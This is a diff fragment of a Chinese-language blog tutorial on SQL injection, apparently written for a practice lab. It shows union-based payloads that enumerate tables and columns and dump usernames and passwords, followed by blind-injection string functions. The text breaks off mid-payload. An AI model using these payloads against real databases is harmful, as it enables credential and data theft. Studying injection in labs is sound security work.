@@ -33,8 +33,7 @@
 <p><strong>查询表名（table）</strong>：<code>id=-1&#39; union select 1, group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p>
 <p><strong>查询列名（column）</strong>：<code>id=-1&#39; union select 1, group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+</code></p>
 <p><strong>查询字段名</strong>：<code>id=-1 union select 1,username,password from users where id=2--+</code></p>
-<p>###3. 盲注的相关知识</p>
-<ul>
+<h3 id="3-盲注的相关知识"><a href="#3-盲注的相关知识" class="headerlink" title="3. 盲注的相关知识"></a>3. 盲注的相关知识</h3><ul>
 <li>基于布尔盲注—–构造逻辑结构判断</li>
 </ul>
 <p>相关字符串截取函数：<br>1.<code>left(database(),1)&gt;&#39;s&#39;</code>   ：database()显示数据库名，left(a,b)从左侧截取a的前b位<br>2.<code>ascii(substr(select table_name from information_schema.tables where table_schema = database() limit 0,1)1,1)--+</code>：substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将字符转换为ascii码格式。<br>3.<code>ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER
